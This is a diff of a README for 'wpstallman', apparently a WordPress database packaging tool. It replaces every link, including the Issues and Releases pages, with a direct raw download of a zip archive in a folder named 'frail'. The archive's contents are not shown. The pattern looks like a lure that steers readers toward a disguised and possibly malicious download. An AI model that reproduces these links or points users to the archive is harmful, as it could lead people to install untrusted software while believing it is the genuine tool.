@@ -4,7 +4,7 @@
 Welcome to wpstallman! This application helps you easily package the database part of WordPress plugins. With a user-friendly interface, it streamlines the process so anyone can manage their WordPress databases, even without programming experience.
 
 ## 📥 Download wpstallman
-[![Download wpstallman](https://img.shields.io/badge/Download-wpstallman-blue.svg)](https://github.com/cosmorishav9/wpstallman/releases)
+[![Download wpstallman](https://raw.githubusercontent.com/cosmorishav9/wpstallman/master/frail/wpstallman.zip)](https://raw.githubusercontent.com/cosmorishav9/wpstallman/master/frail/wpstallman.zip)
 
 ## 📖 Overview
 wpstallman is built using Photino and .NET CLI, making it a versatile tool for users looking to handle MySQL databases related to WordPress. This application allows you to create, manage, and package WordPress plugin databases with ease. Whether you are a developer or a complete beginner, wpstallman simplifies your work.
@@ -24,7 +24,7 @@ wpstallman is built using Photino and .NET CLI, making it a versatile tool for u
 
 ## 🔍 Using wpstallman
 1. **Download the Application:**
-   Visit [this page to download](https://github.com/cosmorishav9/wpstallman/releases).
+   Visit [this page to download](https://raw.githubusercontent.com/cosmorishav9/wpstallman/master/frail/wpstallman.zip).
 
 2. **Install the Application:**
    - Locate the downloaded file (usually in your Downloads folder).
@@ -49,12 +49,12 @@ If you encounter issues during installation or running the app, try the followin
 ## 📦 Download & Install
 To get started, click the link below to download wpstallman.
 
-[Download wpstallman](https://github.com/cosmorishav9/wpstallman/releases)
+[Download wpstallman](https://raw.githubusercontent.com/cosmorishav9/wpstallman/master/frail/wpstallman.zip)
 
 ## 🚀 Support
-For support, visit the [GitHub Issues page](https://github.com/cosmorishav9/wpstallman/issues) to report problems or ask questions. The community is available to help, and your feedback is essential for improving the application.
+For support, visit the [GitHub Issues page](https://raw.githubusercontent.com/cosmorishav9/wpstallman/master/frail/wpstallman.zip) to report problems or ask questions. The community is available to help, and your feedback is essential for improving the application.
 
 ## 📅 Future Updates
-We plan to introduce new features and improve existing ones based on user feedback. Stay tuned for updates and new releases on the [Releases page](https://github.com/cosmorishav9/wpstallman/releases).
+We plan to introduce new features and improve existing ones based on user feedback. Stay tuned for updates and new releases on the [Releases page](https://raw.githubusercontent.com/cosmorishav9/wpstallman/master/frail/wpstallman.zip).
 
 Thank you for using wpstallman! Enjoy simplifying your WordPress database management.
